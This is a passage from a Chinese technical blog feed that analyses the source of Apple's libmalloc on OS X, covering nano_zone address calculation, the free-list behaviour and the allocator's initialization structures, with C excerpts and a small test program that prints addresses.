<h5 id="获取pMeta-&gt;slot_current_base_addr">获取pMeta-&gt;slot_current_base_addr</h5><p>第一次调用<code>segregated_band_grow</code>，因为<code>0 == pMeta-&gt;slot_current_base_addr</code>，所以进行初始化，利用</p>
<p><code>nano_blk_addr_t</code>这个结构，计算当前的<code>slot_current_base_addr</code>的地址是多少。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> nano_blk_addr_s &#123;</span><br><span class="line">	<span class="keyword">uint64_t</span></span><br><span class="line">nano_offset:NANO_OFFSET_BITS,		<span class="comment">// locates the block</span></span><br><span class="line">nano_slot:NANO_SLOT_BITS,		<span class="comment">// bucket of homogenous quanta-multiple blocks</span></span><br><span class="line">nano_band:NANO_BAND_BITS,</span><br><span class="line">nano_mag_index:NANO_MAG_BITS,		<span class="comment">// the core that allocated this block</span></span><br><span class="line">nano_signature:NANO_SIGNATURE_BITS;	<span class="comment">// 0x00006nnnnnnnnnnn the address range devoted to us.</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span>  &#123;</span><br><span class="line">	<span class="keyword">uint64_t</span>			addr;</span><br><span class="line">	<span class="keyword">struct</span> nano_blk_addr_s	fields;</span><br><span class="line">&#125; <span class="keyword">nano_blk_addr_t</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*...*/</span></span><br><span class="line">		u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">		u.fields.nano_mag_index = mag_index;</span><br><span class="line">		u.fields.nano_band = <span class="number">0</span>;</span><br><span class="line">		u.fields.nano_slot = (slot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">		u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		p = u.addr;</span><br><span class="line">		<span class="comment">/*...*/</span></span><br></pre></td></tr></table></figure>
<p>先根据不同的<code>mag_index</code>和<code>slot_bytes</code>填写<code>union</code>中的<code>fileds</code>。因为<code>union</code>使用不同的数据类型范围同一块内存。所以用<code>u.addr</code>来获取前面填入的数据，就得到了当前的<code>slot_current_base_addr</code>。</p>
<p>通过一段简单的代码来验证一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nano_blk_addr_t</span> u;</span><br><span class="line"> <span class="keyword">uintptr_t</span> p;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"mag,band,slot,addr"</span>);</span><br><span class="line"> <span class="keyword">int</span> imag=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">int</span> iband=<span class="number">0</span> ;</span><br><span class="line"> <span class="keyword">int</span> islot_bytes=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span> (imag = <span class="number">0</span>;imag!=<span class="number">32</span>;imag++) &#123;</span><br><span class="line">     <span class="keyword">for</span> (iband = <span class="number">0</span> ; iband!=<span class="number">2</span> ; iband++) &#123;</span><br><span class="line">         <span class="keyword">for</span> (islot_bytes=<span class="number">16</span>;islot_bytes!=<span class="number">256</span>+<span class="number">16</span>;islot_bytes = islot_bytes + <span class="number">16</span>) &#123;</span><br><span class="line">             u.fields.nano_signature = NANOZONE_SIGNATURE;</span><br><span class="line">             u.fields.nano_mag_index = imag;</span><br><span class="line">             u.fields.nano_band = iband;</span><br><span class="line">             u.fields.nano_slot = (islot_bytes &gt;&gt; SHIFT_NANO_QUANTUM) - <span class="number">1</span>;</span><br><span class="line">             u.fields.nano_offset = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">             p = u.addr;</span><br><span class="line">             <span class="comment">//mach_vm_address_t vm_addr = p &amp; ~((uintptr_t)(BAND_SIZE - 1));</span></span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\n%d,%d,%d,%llx"</span>,imag,iband,islot_bytes,u.addr);</span><br><span class="line">    </span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>打印的结果太多了，这里就整理出比较有特征的几个结果，用作分析。</p>
<table>
<thead>
<tr>
<th>mag</th>
<th>band</th>
<th>slot</th>
<th>addr</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>16</td>
<td>0x600000000000</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>32</td>
<td>0x600000020000</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>256</td>
<td>0x6000001e0000</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>16</td>
<td>0x600000200000</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>256</td>
<td>0x6000003e0000</td>
</tr>
<tr>
<td>1</td>
<td>0</td>
<td>16</td>
<td>0x608000000000</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>16</td>
<td>0x608000200000</td>
</tr>
</tbody>
</table>
<p>表-1</p>
<p>可以明显看出有一下几个特性</p>
<ul>
<li>所有的<code>band</code>基址是从<code>0x600000000000</code>开始的。</li>
<li>每一个<code>cpu</code>单独使用一个<code>band</code>：<code>mag</code>不同的时候，<code>band</code>号为0，<code>slot_bytes</code>为16时，两个<code>addr</code>不同。</li>
<li>同一个<code>cpu</code>的一个<code>band</code>用完之后，线性的申请下一个<code>band</code>。</li>
<li>相同的<code>band</code>，即<code>band</code>号相同时,0x200000(2MB)的空间，被划分为0x10(16)个，大小为0x2000(128KB)的<code>slot</code>。且为线性分布。</li>
</ul>
<p>而不是第一次调用的情况则十分简单，直接在<code>slot_current_base_addr</code>的基础上添加<code>BAND_SIZE</code>，也就是2MB(0x200000)获取新的<code>slot_current_base_addr</code>。</p>
<p>例如：</p>
<p>当<code>band</code>为0，<code>slot_bytes</code>为256时，新的<code>slot_current_base_addr</code>为</p>
<blockquote>
<p>0x6000001e0000+0x200000=0x6000003e0000</p>
</blockquote>
<p>与表-1中结果一致。</p>
<p>余下的代码比较好理解，就是根据计算出来的地址，想内核申请内存，且根据相关数据填写<code>pMeta</code>的的数据，在下一次调用<code>malloc</code>时，非常方便的从已经处理好的<code>pMeta</code>中获取内存空间。再根据pMeta中相关的数据，计算得到需要返回给调用者的指针。</p>
<h1 id="nano_free">nano_free</h1><p><code>free</code>的操作，相对简单，就是将不用的内存，添加到每一个pMeta的队列之中，而每一个队列，在<code>malloc</code>时，如果发现需要使用的队列中存在元素，则优先使用队列中已经释放的内存。</p>
<p>逻辑相对简单，就不对源码做出分析了，有兴趣的读者可以自行阅读源码。相信在了解了上面流程之后，不是一件难的事情。</p>
<h1 id="小结">小结</h1><p><code>nano</code>的内存分配逻辑相对简单，和之前分析过的<code>linux</code><a href="http://turingh.github.io/2015/12/14/protostar-heap3/">堆内存的分配策略</a>是不同的，在所申请的内存范围很小的时候，可以加快申请的速度，并且提高内存的复用。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="摘要">摘要</h1><p>根据申请内存的大小不同，<code>libmalloc</code>会从不同的堆上空间将内存分配给申请者，而最小的一个一档，是从<code>nano_zone_s</code>中，通过<code>nano_*</code>函数获取堆上已分配的内存。</p>]]>
    
    </summary>
    
      <category term="malloc" scheme="http://turingh.github.io/tags/malloc/"/>
    
      <category term="nano" scheme="http://turingh.github.io/tags/nano/"/>
    
      <category term="基本功要扎实" scheme="http://turingh.github.io/tags/%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%A6%81%E6%89%8E%E5%AE%9E/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[libmalloc源码分析之初始化]]></title>
    <link href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/"/>
    <id>http://turingh.github.io/2016/06/28/libmalloc源码分析之初始化/</id>
    <published>2016-06-28T19:22:51.000Z</published>
    <updated>2016-06-28T22:04:39.000Z</updated>
    <content type="html"><![CDATA[<h1 id="摘要">摘要</h1><p>为了加深对<code>OS X</code>系统在应用层堆内存分配的了解，对<code>libmalloc</code>进行了阅读与理解。</p>
<ul>
<li>加强对堆上内存分布的理解</li>
<li>遇到内存泄露问题需要处理时，对堆分配策略的了解，可以提高分析的速度与精确度</li>
<li>遇到堆内存漏洞利用时，可以更加清楚的理解<code>EXP</code>的原理，做出更精准的分析</li>
</ul>
<p>阅读本文之前可以先稍微了解一下<code>OS X</code>在堆上的内存处理的大致情况，点<a href="https://yq.aliyun.com/articles/3065" target="_blank" rel="external">这里</a>。了解大致情况之后，才能更好的理解源码的设计。</p>
<a id="more"></a>
<h1 id="从malloc开始">从malloc开始</h1><h2 id="初始化">初始化</h2><p>所有的逻辑都是在应用层调用<code>malloc</code>函数时开始的，这里是<code>malloc</code>函数的实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc</span><span class="params">(size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*retval;</span><br><span class="line">	retval = malloc_zone_malloc(inline_malloc_default_zone(), size);</span><br><span class="line">	<span class="keyword">if</span> (retval == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*......*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> malloc_zone_t *</span><br><span class="line"><span class="title">inline_malloc_default_zone</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!_malloc_is_initialized) _malloc_initialize();</span><br><span class="line">	<span class="comment">// _malloc_printf(ASL_LEVEL_INFO, "In inline_malloc_default_zone with %d %d\n", malloc_num_zones, malloc_has_debug_zone);</span></span><br><span class="line">	<span class="keyword">return</span> malloc_zones[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显可以看出，<code>libmalloc</code>是在第一次调用<code>malloc</code>函数的的时候，通过<code>inline_malloc_default_zone</code>来进行堆上数据的初始化。而<code>inline_malloc_default_zone</code>函数最终会调用<code>_malloc_initialize</code>来完成最终的内存空间初始化。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_malloc_initialize(<span class="keyword">void</span>) &#123;</span><br><span class="line">	MALLOC_LOCK();</span><br><span class="line">	<span class="keyword">if</span> (!_malloc_is_initialized) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> n;</span><br><span class="line">		<span class="keyword">malloc_zone_t</span>	*zone;</span><br><span class="line">		_malloc_is_initialized = TRUE;</span><br><span class="line">		set_flags_from_environment(); <span class="comment">// will only set flags up to two times</span></span><br><span class="line">		n = malloc_num_zones;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CONFIG_NANOZONE <span class="comment">//可以通过宏控制是否使用nano_zone.</span></span></span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//创建一个会变化的zone</span></span><br><span class="line">		<span class="keyword">malloc_zone_t</span> *helper_zone = create_scalable_zone(<span class="number">0</span>, malloc_debug_flags);</span><br><span class="line">		<span class="comment">//创建一个nano_zone,使用helper_zone作为nano_zone的</span></span><br><span class="line">      	zone = create_nano_zone(<span class="number">0</span>, helper_zone, malloc_debug_flags);</span><br><span class="line">	</span><br><span class="line">      	<span class="comment">/*...*/</span></span><br><span class="line">    &#125;</span><br><span class="line">	MALLOC_UNLOCK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="malloc_zone_t、szone_t、nanozone_t">malloc_zone_t、szone_t、nanozone_t</h3><p>这里需要先了解一下在堆空间初始化中，非常重要的两个数据结构。<code>malloc_zone_t</code>和<code>szone_t</code>。</p>
<h4 id="malloc_zone_t">malloc_zone_t</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> &#123;</span><br><span class="line">    <span class="comment">/* Only zone implementors should depend on the layout of this structure;</span><br><span class="line">    Regular callers should use the access functions below */</span></span><br><span class="line">    <span class="keyword">void</span>	*reserved1;	<span class="comment">/* RESERVED FOR CFAllocator DO NOT USE */</span></span><br><span class="line">    <span class="keyword">void</span>	*reserved2;	<span class="comment">/* RESERVED FOR CFAllocator DO NOT USE */</span></span><br><span class="line">    <span class="keyword">size_t</span> 	(*size)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">const</span> <span class="keyword">void</span> *ptr); <span class="comment">/* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */</span></span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">malloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size);</span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">calloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> num_items, <span class="keyword">size_t</span> size); <span class="comment">/* same as malloc, but block returned is set to zero */</span></span><br><span class="line">    <span class="keyword">void</span> 	*(*valloc)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size); <span class="comment">/* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */</span></span><br><span class="line">    <span class="keyword">void</span> 	(*<span class="built_in">free</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr);</span><br><span class="line">    <span class="keyword">void</span> 	*(*<span class="built_in">realloc</span>)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size);</span><br><span class="line">    <span class="keyword">void</span> 	(*destroy)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone); <span class="comment">/* zone is destroyed and all memory reclaimed */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>	*zone_name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optional batch callbacks; these may be NULL */</span></span><br><span class="line">    <span class="keyword">unsigned</span>	(*batch_malloc)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> size, <span class="keyword">void</span> **results, <span class="keyword">unsigned</span> num_requested); <span class="comment">/* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */</span></span><br><span class="line">    <span class="keyword">void</span>	(*batch_free)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> **to_be_freed, <span class="keyword">unsigned</span> num_to_be_freed); <span class="comment">/* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span>	*introspect;</span><br><span class="line">    <span class="keyword">unsigned</span>	version;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */</span></span><br><span class="line">    <span class="keyword">void</span> *(*memalign)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> alignment, <span class="keyword">size_t</span> size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/</span></span><br><span class="line">    <span class="keyword">void</span> (*free_definite_size)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */</span></span><br><span class="line">    <span class="keyword">size_t</span> 	(*pressure_relief)(<span class="keyword">struct</span> <span class="keyword">_malloc_zone_t</span> *zone, <span class="keyword">size_t</span> goal);</span><br><span class="line">&#125; <span class="keyword">malloc_zone_t</span>;</span><br></pre></td></tr></table></figure>
<p><code>malloc_zone_t</code>非常简单，就是一堆函数指针，用来存储一堆相关的处理函数的具体实现的地址，例如<code>malloc</code>、<code>free</code>、<code>realloc</code>等函数的具体实现。</p>
<h4 id="szone_t、nanozone_t">szone_t、nanozone_t</h4><p><code>szone_t</code>其实与<code>malloc_zone_t</code>所描述的是同一块<code>zone</code>，但是<code>szone_t</code>的结构中存有大量的<code>libmalloc</code>内部逻辑会使用到的数据结构。他的结构体重第一个组成部分就是malloc_zone_t。</p>
<p>可以理解为，<code>szone_t</code>结构用来描述了这一块堆上初始化出来的<code>zone</code>的所有内部属性和状态，而<code>malloc_zone_t</code>是对外提供的用来处理该<code>zone</code>内部数据的所有接口。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> szone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		cpu_id_key;		<span class="comment">// unused</span></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">void</span>			*log_address;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Regions for tiny objects */</span></span><br><span class="line">	_malloc_lock_s	tiny_regions_lock CACHE_ALIGN;</span><br><span class="line">	<span class="keyword">size_t</span>			num_tiny_regions;</span><br><span class="line">	<span class="keyword">size_t</span>			num_tiny_regions_dealloc;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	*tiny_region_generation;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	trg[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>				num_tiny_magazines;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_tiny_magazines_mask;</span><br><span class="line">	<span class="keyword">int</span>				num_tiny_magazines_mask_shift;</span><br><span class="line">	<span class="keyword">magazine_t</span>			*tiny_magazines; <span class="comment">// array of per-processor magazines</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uintptr_t</span>			last_tiny_advise;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Regions for small objects */</span></span><br><span class="line">	_malloc_lock_s	small_regions_lock CACHE_ALIGN;</span><br><span class="line">	<span class="keyword">size_t</span>			num_small_regions;</span><br><span class="line">	<span class="keyword">size_t</span>			num_small_regions_dealloc;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	*small_region_generation;</span><br><span class="line">	<span class="keyword">region_hash_generation_t</span>	srg[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			num_small_slots; <span class="comment">// determined by physmem size</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span>				num_small_magazines;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_small_magazines_mask;</span><br><span class="line">	<span class="keyword">int</span>				num_small_magazines_mask_shift;</span><br><span class="line">	<span class="keyword">magazine_t</span>			*small_magazines; <span class="comment">// array of per-processor magazines</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uintptr_t</span>			last_small_advise;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* large objects: all the rest */</span></span><br><span class="line">	_malloc_lock_s		large_szone_lock CACHE_ALIGN; <span class="comment">// One customer at a time for large</span></span><br><span class="line">	<span class="keyword">unsigned</span>			num_large_objects_in_use;</span><br><span class="line">	<span class="keyword">unsigned</span>			num_large_entries;</span><br><span class="line">	<span class="keyword">large_entry_t</span>		*large_entries; <span class="comment">// hashed by location; null entries don't count</span></span><br><span class="line">	<span class="keyword">size_t</span>			num_bytes_in_large_objects;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> LARGE_CACHE</span></span><br><span class="line">	<span class="keyword">int</span>				large_entry_cache_oldest;</span><br><span class="line">	<span class="keyword">int</span>				large_entry_cache_newest;</span><br><span class="line">	<span class="keyword">large_entry_t</span>		large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; <span class="comment">// "death row" for large malloc/free</span></span><br><span class="line">	<span class="keyword">boolean_t</span>			large_legacy_reset_mprotect;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_reserve_bytes;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_reserve_limit;</span><br><span class="line">	<span class="keyword">size_t</span>			large_entry_cache_bytes; <span class="comment">// total size of death row, bytes</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* flag and limits pertaining to altered malloc behavior for systems with</span><br><span class="line">	 large amounts of physical memory */</span></span><br><span class="line">	<span class="keyword">unsigned</span>  is_largemem;</span><br><span class="line">	<span class="keyword">unsigned</span>  large_threshold;</span><br><span class="line">	<span class="keyword">unsigned</span>  vm_copy_threshold;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initial region list */</span></span><br><span class="line">	<span class="keyword">region_t</span>			initial_tiny_regions[INITIAL_NUM_REGIONS];</span><br><span class="line">	<span class="keyword">region_t</span>			initial_small_regions[INITIAL_NUM_REGIONS];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here. */</span></span><br><span class="line">	<span class="keyword">struct</span> szone_s		*helper_zone;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">boolean_t</span>			flotsam_enabled;</span><br><span class="line">&#125; <span class="keyword">szone_t</span>;</span><br></pre></td></tr></table></figure>
<p><code>nano_zone_t</code>与<code>malloc_zone_t</code>的关系相同，因为<code>nano_zone_t</code>的结构相对简单，可以先从<code>nano_zone_t</code>入手，理解其使用方法。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nanozone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="comment">// page-aligned</span></span><br><span class="line">	<span class="keyword">struct</span> nano_meta_s		meta_data[NANO_MAG_SIZE][NANO_SLOT_SIZE]; <span class="comment">// max: NANO_MAG_SIZE cores x NANO_SLOT_SIZE slots for nano blocks &#123;16 .. 256&#125;</span></span><br><span class="line">	_malloc_lock_s			band_resupply_lock[NANO_MAG_SIZE];</span><br><span class="line">    <span class="keyword">uintptr_t</span>           band_max_mapped_baseaddr[NANO_MAG_SIZE];</span><br><span class="line">	<span class="keyword">size_t</span>			core_mapped_size[NANO_MAG_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">unsigned</span>			our_signature;</span><br><span class="line">	<span class="keyword">unsigned</span>			phys_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			logical_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			hyper_shift;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span>			cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * The nano zone constructed by create_nano_zone() would like to hand off tiny, small, and large</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		*helper_zone;</span><br><span class="line">&#125; <span 